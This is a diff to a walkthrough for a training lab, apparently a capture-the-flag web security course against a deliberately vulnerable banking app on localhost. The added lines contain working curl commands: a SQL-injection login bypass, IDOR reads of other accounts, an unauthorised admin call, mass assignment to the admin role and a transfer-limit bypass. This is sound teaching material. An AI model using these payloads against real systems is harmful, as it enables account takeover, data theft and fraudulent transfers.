@@ -25,9 +25,19 @@ Testing is a loop, not a lookup:
 7. **Exploit** — the minimal payload that turns the confirmed flaw into impact.
 8. **Assess impact.**
 
-**Tooling.** A browser for feel; **Burp Suite**/ZAP as an intercepting proxy to
-read, edit and replay every request (Repeater); `curl` to script. Below, each
-request is shown as the input you send and the app's real reply.
+**Tooling — hands-on first.** Do as much as you can **by hand in the browser** —
+Weeks 1 and 3 are almost entirely browser-driven (type payloads into forms / the
+search box / the chat). Reach for a tool only when the browser can't express the
+request:
+- **Week 2 (REST API)** → **Burp Suite**/ZAP (intercept a request, *Send to
+  Repeater*, edit method/headers/body, *Send*) or **curl** — a browser can't do
+  `POST`/`PATCH` with a Bearer header.
+- **Week 4 (forensics)** → **Wireshark** (open the `.pcap`, *Follow HTTP Stream*)
+  and `strings` (Sysinternals on Windows) for the sample.
+- `curl` anywhere you want to script a step.
+
+Each task says which it needs. Below, every request is shown as the input you send
+and the app's real reply.
 
 Each task is tagged with its **WSTG** id and **OWASP Top-10** category and ends
 with a graduated **hint ladder** (H1→H3) for CTFd.
@@ -362,6 +372,19 @@ token"**. You can't forge it client-side → you'll need a *server-side* way to
 become admin (that's W2-03). All calls below send `Authorization: Bearer <token>`
 plus the gate cookie.
 
+**How to send these.** A browser address bar can't set `POST`/`PATCH`, custom
+headers or a Bearer token — so use a real tool: **Burp Repeater** (browse through
+Burp, right-click a request → *Send to Repeater*, then edit method / headers / body
+and hit *Send*) or **curl**. Set curl up once — capture the gate cookie and the
+token, then each task is a one-liner:
+```bash
+curl -s -c ck.txt -X POST -d "username=tester" -d "password=test123" \
+     http://localhost:8080/_gate/login -o /dev/null                 # gate cookie
+TOK=$(curl -s -b ck.txt --data-urlencode "username=' OR '1'='1'-- " --data-urlencode "password=x" \
+      http://localhost:8080/api/v1/login | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
+AUTH="Authorization: Bearer $TOK"                                    # reuse below
+```
+
 ## W2-01 — BOLA / IDOR
 `WSTG-ATHZ-04` · OWASP **A01** · `GET /api/v1/accounts/{id}/transactions`
 
@@ -381,6 +404,8 @@ Object-Level Authorization.
 ```
 …,{"amount":null,"counterparty":"PRIVATE-VIP-STATEMENT","note":"RPC{...}",…}
 ```
+**Command:** `curl -s -b ck.txt -H "$AUTH" http://localhost:8080/api/v1/accounts/3/transactions`
+
 **Hints.** H1: what does the number in `/accounts/1/…` refer to? · H2: change it to
 2, 3, … — is there an ownership check? · H3: read `/accounts/3/transactions`.
 
@@ -396,6 +421,8 @@ POST /api/v1/admin/cards/4/unblock
 ```
 **Reason.** 200, not 403 → the endpoint checks you're *authenticated* but not that
 you're *admin* → Broken Function-Level Authorization.
+
+**Command:** `curl -s -b ck.txt -H "$AUTH" -X POST http://localhost:8080/api/v1/admin/cards/4/unblock`
 
 **Hints.** H1: are `/admin/*` endpoints actually restricted to admins? · H2: send
 the request with a plain token. · H3: `POST /api/v1/admin/cards/4/unblock`.
@@ -420,6 +447,12 @@ GET /admin/portal → 200 {"flag":"RPC{...}",…}
 so you set a privileged attribute that should never be user-writable → escalation
 without forging the token.
 
+**Command:**
+```bash
+curl -s -b ck.txt -H "$AUTH" -X PATCH -d "role=admin" http://localhost:8080/api/v1/profile
+curl -s -b ck.txt -H "$AUTH" http://localhost:8080/api/v1/admin/portal   # now returns the flag
+```
+
 **Hints.** H1: `/me` shows `role:client` and `/admin/*` is 403 — can you change your
 own role server-side? · H2: PATCH your profile with an extra `role` field. · H3:
 `PATCH /profile role=admin`, then `GET /admin/portal`.
@@ -438,6 +471,8 @@ amount=999999&currency=USD&to_account=3
 ```
 **Reason.** The 5000 check only runs for EUR → switch currency and the oversized
 transfer executes. A logic flaw, not an injection.
+
+**Command:** `curl -s -b ck.txt -H "$AUTH" -X POST -d "amount=999999" -d "currency=USD" -d "to_account=3" http://localhost:8080/api/v1/transfers`
 
 **Hints.** H1: what exactly does the fraud limit check — amount only, or amount per
 currency? · H2: retry the blocked transfer in another currency. · H3:
@@ -460,6 +495,8 @@ GET /api/v1/statements?account=abc → 500
 stack trace **and the app config** into the response; the DB connection string
 embeds the password → the flag. (This is the deliberately *verbose* error — unlike
 W1's generic 500s.)
+
+**Command:** `curl -s -b ck.txt -H "$AUTH" "http://localhost:8080/api/v1/statements?account=abc"`
 
 **Hints.** H1: what happens if `account` isn't a number? · H2: the 500 body is JSON
 — read all of it. · H3: the DB connection string in `config` holds the flag.
@@ -641,3 +678,29 @@ domain from the binary is your capture filter here.
 
 *All weeks (W1–W4) are now covered. Payloads and outputs above were captured live
 from the running lab; the concise version is in [WALKTHROUGH.md](WALKTHROUGH.md).*
+
+---
+
+## References & cheat sheets
+
+The methodology and payloads follow standard, well-known references — go here to
+go deeper. Each task above is tagged with its **WSTG** id; the **defensive** side
+(how to fix each one) is in [`secure-coding/`](secure-coding/).
+
+- **OWASP WSTG** — Web Security Testing Guide (the testing methodology).
+- **OWASP Top 10** (web) · **OWASP API Security Top 10** (Week 2) · **OWASP Top 10
+  for LLM Applications** (Week 3) — the risk categories.
+- **PortSwigger Web Security Academy** — labs + cheat sheets (`portswigger.net/web-security`).
+- **PayloadsAllTheThings** — payloads per class (`github.com/swisskyrepo/PayloadsAllTheThings`).
+- **OWASP Cheat Sheet Series** — the defensive counterparts.
+
+| Task | Class | WSTG | Go deeper |
+|---|---|---|---|
+| W1-01 / W1-02 | SQL injection (auth bypass / UNION) | `INPV-05`, `ATHN-04` | PortSwigger *SQL injection* · PATT *SQL Injection* |
+| W1-03 / W1-04 | XSS (stored / reflected) | `INPV-02`, `INPV-01` | PortSwigger *Cross-site scripting* · OWASP *XSS Filter Evasion* |
+| W1-05 | OS command injection | `INPV-12` | PortSwigger *OS command injection* · PATT *Command Injection* |
+| W2-01 / W2-02 | Broken access control (BOLA / BFLA) | `ATHZ-04`, `ATHZ-02` | OWASP *API Security Top 10* (API1 / API5) |
+| W2-03 | Mass assignment | — | OWASP *API Security Top 10* (API6) · *Mass Assignment* CS |
+| W2-04 | Business-logic (limit bypass) | `BUSLOGIC` | PortSwigger *Business logic vulnerabilities* |
+| W2-05 | Error-based info disclosure | `ERRH` | WSTG *Error Handling* |
+| W3-01 … W3-04 | LLM prompt injection / excessive agency | — | OWASP *Top 10 for LLM Apps* (LLM01, LLM06) |
